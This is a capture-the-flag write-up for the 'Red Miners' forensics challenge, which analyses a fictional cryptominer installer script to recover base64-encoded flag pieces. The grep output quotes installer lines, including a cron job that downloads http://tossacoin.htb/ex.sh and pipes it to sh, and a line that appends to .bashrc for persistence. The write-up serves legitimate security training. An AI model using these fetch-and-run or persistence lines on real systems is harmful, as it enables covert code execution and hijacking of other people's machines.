# Red Miners

## Challenge description

In the race for Vitalium on Mars, the villainous Board of Arodor resorted to desperate measures, needing funds for their mining attempts. They devised a botnet specifically crafted to mine cryptocurrency covertly. We stumbled upon a sample of Arodor's miner's installer on our server. Recognizing the gravity of the situation, we launched a thorough investigation. With you as its leader, you need to unravel the inner workings of the installation mechanism. The discovery served as a turning point, revealing the extent of Arodor's desperation. However, the battle for Vitalium continued, urging us to remain vigilant and adapt our cyber defenses to counter future threats.

## Solution

As soon as you find and decode any `base64` line in the script, it will become clear that the flag is broken into parts and is located in these `base64` lines:

```bash
$ grep -rn '==' miner_installer.sh
...
636:  local url="http://tossacoin.htb/cGFydDI9Il90aDMxcl93NHkiCg=="
700:  dest=$(echo "X3QwX200cnN9Cg=="|base64 -d)
725:  echo "ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==" | base64 -d >> /home/$USER/.bashrc
761:    echo '* * * * * $LDR http://tossacoin.htb/ex.sh | sh & echo -n cGFydDE9IkhUQnttMW4xbmciCg==|base64 -d > /dev/null 2>&1'
```
